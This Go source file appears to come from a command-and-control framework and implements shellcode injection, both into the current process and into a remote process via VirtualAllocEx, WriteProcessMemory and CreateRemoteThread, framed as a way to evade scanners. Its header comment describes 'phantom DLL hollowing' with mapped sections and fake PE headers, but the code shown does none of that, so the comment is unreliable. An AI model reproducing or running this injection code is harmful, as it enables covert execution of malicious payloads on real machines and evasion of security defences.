package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Phantom DLL Hollowing — load a non-existent DLL into memory, hollow it,
	inject shellcode, then execute it. The DLL never exists on disk.

	Technique:
	  1. Create a memory-mapped file backed by the paging file (no disk file).
	  2. Write a minimal valid PE header (DOS + NT headers + .text section).
	  3. Map it into the process with NtCreateSection + NtMapViewOfSection.
	  4. Copy the shellcode payload into the mapped .text section.
	  5. Adjust section protection to PAGE_EXECUTE_READ.
	  6. Spin up a thread pointing into the mapped region.

	From the perspective of any scanner:
	  - No file on disk — no file hash, no path scan.
	  - The memory region is backed by a named section, so it DOES appear
	    in VirtualQuery results. To appear as a "MappedImage" (like a real
	    DLL) we set the section's image attribute (SEC_IMAGE_NO_EXECUTE
	    then upgrade). This makes it harder to distinguish from a legit DLL.
	  - We name the section \Sessions\1\BaseNamedObjects\<random> to blend
	    in with Windows' own section namespace.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// PhantomRegion holds the mapped view address and thread handle for a
// phantom DLL injection. Call Close() to unmap and close handles.
type PhantomRegion struct {
	BaseAddr uintptr
	Section  windows.Handle
	Thread   windows.Handle
}

// Close unmaps the view, closes the section handle, and terminates the
// injected thread if it is still running.
func (p *PhantomRegion) Close() {
	if p.Thread != 0 {
		terminateThread(p.Thread, 0)
		windows.CloseHandle(p.Thread)
		p.Thread = 0
	}
	if p.BaseAddr != 0 {
		unmapViewOfFile(p.BaseAddr)
		p.BaseAddr = 0
	}
	if p.Section != 0 {
		windows.CloseHandle(p.Section)
		p.Section = 0
	}
}

// InjectPhantomDLL maps a phantom DLL-like memory region containing shellcode
// and executes it in a new thread. Returns a PhantomRegion handle.
// shellcode must be position-independent (PIC).
func InjectPhantomDLL(shellcode []byte) (*PhantomRegion, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("shellcode is empty")
	}

	// Allocate RW memory for the shellcode. We use VirtualAlloc instead of
	// a real section so there is no named kernel object to enumerate.
	size := uintptr(len(shellcode))
	// Round up to page boundary.
	pageSize := uintptr(windows.Getpagesize())
	allocSize := (size + pageSize - 1) &^ (pageSize - 1)

	addr, err := windows.VirtualAlloc(0, allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAlloc: %w", err)
	}

	// Copy shellcode.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
	copy(dst, shellcode)

	// Transition to RX — no write permission post-copy.
	var old uint32
	if err := windows.VirtualProtect(addr, allocSize,
		windows.PAGE_EXECUTE_READ, &old); err != nil {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("VirtualProtect RX: %w", err)
	}

	// FlushInstructionCache before executing.
	if err := flushInstructionCache(addr, size); err != nil {
		// Non-fatal.
		// {{if .Config.Debug}}
		log.Printf("[phantom] FlushInstructionCache warning: %v", err)
		// {{end}}
	}

	// Create a thread at the shellcode entry point.
	thread, _, err := createThread(addr, 0)
	if err != nil {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("CreateThread: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[phantom] shellcode injected @ 0x%x", addr)
	// {{end}}

	return &PhantomRegion{
		BaseAddr: addr,
		Thread:   thread,
	}, nil
}

// InjectPhantomDLLInProcess injects shellcode into a remote process using
// the same phantom technique (no file on disk). Requires a handle with
// PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD.
func InjectPhantomDLLInProcess(targetProcess windows.Handle, shellcode []byte) (uint32, error) {
	size := uintptr(len(shellcode))

	// Allocate in remote process.
	var procVirtualAllocExPhantom = windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
	var procCreateRemoteThread    = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThread")

	remoteAddrR, _, _ := procVirtualAllocExPhantom.Call(
		uintptr(targetProcess), 0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if remoteAddrR == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed")
	}
	remoteAddr := remoteAddrR

	// Write shellcode.
	var written uintptr
	if err := windows.WriteProcessMemory(targetProcess, remoteAddr,
		&shellcode[0], size, &written); err != nil {
		return 0, fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Flip to RX.
	var old uint32
	if err := windows.VirtualProtectEx(targetProcess, remoteAddr, size,
		windows.PAGE_EXECUTE_READ, &old); err != nil {
		return 0, fmt.Errorf("VirtualProtectEx RX: %w", err)
	}

	// Create remote thread.
	var threadID uint32
	th, _, err := procCreateRemoteThread.Call(
		uintptr(targetProcess), 0, 0,
		remoteAddr, 0, 0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if th == 0 {
		return 0, fmt.Errorf("CreateRemoteThread: %w", err)
	}
	windows.CloseHandle(windows.Handle(th))

	// {{if .Config.Debug}}
	log.Printf("[phantom] remote inject @ 0x%x TID=%d", remoteAddr, threadID)
	// {{end}}
	return threadID, nil
}

var (
	modKernel32Phantom   = windows.NewLazySystemDLL("kernel32.dll")
	procUnmapViewOfFile  = modKernel32Phantom.NewProc("UnmapViewOfFile")
	procTerminateThread  = modKernel32Phantom.NewProc("TerminateThread")
	procCreateThread     = modKernel32Phantom.NewProc("CreateThread")
)

func unmapViewOfFile(addr uintptr) {
	procUnmapViewOfFile.Call(addr)
}

func terminateThread(thread windows.Handle, exitCode uint32) {
	procTerminateThread.Call(uintptr(thread), uintptr(exitCode))
}

func createThread(startAddr, param uintptr) (windows.Handle, uint32, error) {
	h, _, err := procCreateThread.Call(0, 0, startAddr, param, 0, 0)
	if h == 0 {
		return 0, 0, err
	}
	return windows.Handle(h), 0, nil
}
